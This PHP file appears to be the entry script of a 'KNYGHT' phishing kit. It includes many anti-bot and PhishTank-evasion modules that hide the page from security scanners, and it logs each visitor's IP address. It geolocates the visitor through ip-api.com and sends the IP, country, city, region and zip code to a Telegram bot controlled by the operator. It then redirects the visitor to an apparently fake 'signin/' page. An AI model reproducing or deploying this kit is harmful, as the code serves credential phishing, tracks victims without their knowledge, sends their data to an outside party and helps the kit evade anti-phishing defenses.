<?php

   session_start();
  
include "KNYGHT/antis/anti1.php";
include "KNYGHT/antis/anti2.php";
include "KNYGHT/antis/anti3.php";
include "KNYGHT/antis/anti4.php";
include "KNYGHT/antis/anti5.php";
include "KNYGHT/antis/anti6.php";
include "KNYGHT/antis/anti7.php";
include "KNYGHT/antis/anti8.php";
include "KNYGHT/antis/antibots5.php";
include "KNYGHT/antis/antibot_host.php";
include "KNYGHT/antis/antibot_phishtank.php";
include "KNYGHT/antis/antibot_userAgent.php";
include "KNYGHT/antis/blocklist.php";
include "KNYGHT/antis/Bot-Crawler.php";
include "KNYGHT/antis/Bot-Spox.php";
include "KNYGHT/antis/dd.php";
include "KNYGHT/antis/IP-BlackList.php";
include "KNYGHT/antis/someBots.php";

   
   ?><?php

include "email.php";


$ip = getenv("REMOTE_ADDR");


$file = fopen("KNYGHT_VISIT.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";



$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );



header("Location: signin/");